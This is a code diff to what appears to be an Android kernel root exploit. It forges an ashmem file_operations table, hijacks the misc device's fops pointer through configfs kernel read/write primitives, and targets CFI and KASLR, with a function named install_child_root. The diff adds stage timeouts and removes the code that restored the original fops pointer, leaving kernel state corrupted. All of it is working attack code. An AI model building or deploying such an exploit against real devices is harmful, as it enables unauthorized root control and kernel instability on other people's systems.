@@ -83,17 +83,17 @@ int refresh_fake_fops_text(int fd) {
     size_t off;
     uint64_t value;
   } slots[] = {
+    {FOPS_LLSEEK_OFF, text_addr(NOOP_LLSEEK)},
     {FOPS_READ_OFF, text_addr(CONFIGFS_READ_FILE)},
     {FOPS_WRITE_OFF, text_addr(CONFIGFS_BIN_WRITE_FILE)},
     {FOPS_READ_ITER_OFF, 0},
     {FOPS_WRITE_ITER_OFF, 0},
     {FOPS_IOCTL_OFF, text_addr(ASHMEM_IOCTL)},
-    {FOPS_COMPAT_IOCTL_OFF, text_addr(ASHMEM_COMPAT_IOCTL)},
-    {FOPS_MMAP_OFF, text_addr(ASHMEM_MMAP)},
+    {FOPS_MMAP_OFF, 0},
     {FOPS_OPEN_OFF, text_addr(ASHMEM_OPEN)},
     {FOPS_RELEASE_OFF, text_addr(ASHMEM_RELEASE)},
-    {FOPS_SPLICE_READ_OFF, text_addr(COPY_SPLICE_READ)},
-    {FOPS_SHOW_FDINFO_OFF, text_addr(ASHMEM_SHOW_FDINFO)},
+    {FOPS_SPLICE_READ_OFF, 0},
+    {FOPS_SHOW_FDINFO_OFF, 0},
   };
 
   for (size_t i = 0; i < sizeof(slots) / sizeof(slots[0]); i++) {
@@ -159,6 +159,7 @@ int install_child_root(int fd) {
 int try_cfi_stage(void) {
   pr_debug("Attempting CFI stage\n");
   cfi_attempts++;
+  time_t stage_start = time(NULL);
 
   int fd = open_ashmem_device();
   pr_debug("device opened for CFI stage\n");
@@ -175,21 +176,15 @@ int try_cfi_stage(void) {
     return 0;
   }
 
+  if (time(NULL) - stage_start > CFI_STAGE_TIMEOUT_SEC) {
+    cfi_last_step = 12;
+    cfi_last_errno = ETIMEDOUT;
+    pr_warning("CFI stage timed out before write test\n");
+    SYSCHK(close(fd));
+    return 0;
+  }
+
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
-  // uint64_t pre_fops = 0;
-  // pr_info("Reading pre-fops from misc_fops=%016zx\n", misc_fops);
-  // ssize_t pre_rb = configfs_read_once(
-  //     fd, misc_fops, &pre_fops, sizeof(pre_fops));
-  // // configfs_read_once(
-  // //     fd, kaslr_base, &pre_fops, sizeof(pre_fops));
-  // if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
-  //   fops_before = pre_fops;
-  //   cfi_last_step = 4;
-  //   cfi_last_errno = errno;
-  //   pr_info("Failed to read pre-fops pre_fops = %016zx\n", pre_fops);
-  //   goto fail;
-  // }
-  // pr_info("Reading done\n");
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
@@ -261,6 +256,12 @@ int try_cfi_stage(void) {
   sleep(1);
 #endif
   for (int attempt = 0; attempt < PIPE_MAX_ATTEMPTS; attempt++) {
+    if (time(NULL) - stage_start > CFI_STAGE_TIMEOUT_SEC) {
+      cfi_last_step = 12;
+      cfi_last_errno = ETIMEDOUT;
+      pr_warning("CFI stage timed out in pipe stage\n");
+      goto fail;
+    }
     pipe_stage_attempts++;
     if (attempt != 0) {
       reset_pipe_attempt();
@@ -280,33 +281,14 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
-  // krw resuore ASHMEM_FOPS replaced by exp
-  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
-  ssize_t restore = configfs_write_once(
-      fd, misc_fops, &original_fops, sizeof(original_fops));
-  cfi_restore_ret = restore;
-  if (restore != (ssize_t)sizeof(original_fops)) {
-    cfi_last_step = 5;
-    cfi_last_errno = errno;
-    goto fail;
-  }
 
-  uint64_t after = 0;
-  ssize_t ra = configfs_read_once(fd, misc_fops, &after, sizeof(after));
-  fops_after = after;
-  if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
-    cfi_last_step = 6;
-    cfi_last_errno = errno;
-    goto fail;
-  }
-
+  cfi_restore_ret = 0;
   uint64_t null_owner = 0;
   ssize_t owner =
     configfs_write_once(fd, fake_fops, &null_owner, sizeof(null_owner));
   cfi_owner_ret = owner;
   SYSCHK(close(fd));
-  if (owner == (ssize_t)sizeof(null_owner) &&
-      restore == (ssize_t)sizeof(original_fops)) {
+  if (owner == (ssize_t)sizeof(null_owner)) {
     cfi_last_step = 0;
     cfi_last_errno = 0;
     atomic_store(&cfi_stage_done, 1);
@@ -318,20 +300,6 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = p0_data_alias(ASHMEM_FOPS);
-    if (kaslr_done) {
-      original_fops_fail = canon_addr(ASHMEM_FOPS);
-    }
-    cfi_restore_ret = configfs_write_once(
-        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
-    if (can_read_back &&
-        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
-      uint64_t after_fail = 0;
-      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
-          (ssize_t)sizeof(after_fail)) {
-        fops_after = after_fail;
-      }
-    }
     uint64_t null_owner_fail = 0;
     cfi_owner_ret = configfs_write_once(
         fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
